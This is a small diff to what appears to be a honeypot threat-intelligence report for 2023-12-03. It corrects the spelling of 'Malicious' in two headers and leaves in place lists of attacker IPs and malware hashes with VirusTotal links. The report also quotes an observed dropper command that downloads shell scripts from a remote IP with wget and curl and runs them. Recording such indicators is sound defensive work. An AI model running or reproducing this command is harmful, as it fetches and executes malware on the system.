@@ -6,7 +6,7 @@ Top 5 IPs for 2023-12-03:
 181.114.109.54
 
 
-Malcious files seen: 
+Malicious files seen: 
 0712f3c3c0df94b75e148ea1ecf69cdca4de0a4090d6d1295896c52f488db312
 https://www.virustotal.com/gui/file/0712f3c3c0df94b75e148ea1ecf69cdca4de0a4090d6d1295896c52f488db312
 47f759270740a2df6ba11ffcd00d84060f626ea1650f40bc9a0f7195efa41099
@@ -18,5 +18,5 @@ https://www.virustotal.com/gui/file/904c6823862a05e16dac8030e023a7b25efeae768345
 
 
 
-Malcious command seen:
+Malicious command seen:
 cd /data/local/tmp/; busybox wget http://14.225.211.141/w.sh; sh w.sh; curl http://14.225.211.141/c.sh; sh c.sh; wget http://14.225.211.141/wget.sh; sh wget.sh; curl http://14.225.211.141/wget.sh; sh wget.sh; busybox wget http://14.225.211.141/wget.sh; sh wget.sh; busybox curl http://14.225.211.141/wget.sh; sh wget.sh
